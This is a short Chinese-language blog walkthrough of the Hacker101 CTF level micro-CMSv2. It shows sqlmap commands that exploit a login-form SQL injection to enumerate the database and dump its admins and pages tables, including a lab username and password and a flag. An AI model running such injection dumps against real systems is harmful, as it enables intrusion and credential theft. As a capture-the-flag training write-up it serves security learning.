---
title: hacker101-microCMSv2
date: 2019-07-03 22:02:22
tags: 
category: walkthrough
---
记录 hacker101 CTF

<!-- more -->

# 要点

简单的 sqlmap 执行

```shell
sqlmap -r micro-cms --random-agent -p username -current-db
sqlmap -r mico-cms --random-agent -p username -D level2 --tables
sqlmap -r mico-cms --random-agent -p username -D level2 -T admins --dump 
```



# walkthrough

micro-CMSv2 主要的漏洞是在登录的时候存在 SQL 注入。

1. 首先将 Burp 接受到的请求存起来

   ![micro-cms-v2](/postimg/microcmsv2-1.jpg)

2. 查询当前数据

```shell
sqlmap -r micro-cms --random-agent -p username -current-db
sqlmap -r mico-cms --random-agent -p username -D level2 --tables

# 结果
database: level2
[2 tables]
+--------+
| admins |
| pages  |
+--------+
```

3. 查询两个数据库表的内容

```
sqlmap -r mico-cms --random-agent -p username -D level2 -T admins --dump 

# 输出
Database: level2
Table: admins
[1 entry]
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | darci    | krystina |
+----+----------+----------+

sqlmap -r mico-cms --random-agent -p username -D level2 -T pages --dump 

# 输出
...
[10:01:06] [INFO] retrieved: 'Markdown Test'
[10:01:09] [INFO] retrieved: 'My secret is ^FLAG^a1<flag>5$FLAG$' # 找到第一个flag
[10:01:09] [INFO] retrieved: '3'
[10:01:10] [INFO] retrieved: '0'
[10:01:10] [INFO] retrieved: 'Private Page'

```

4. 使用用户名密码登录，找到第二个 flag
5. post  /page/edit/3 找到第三个 flag

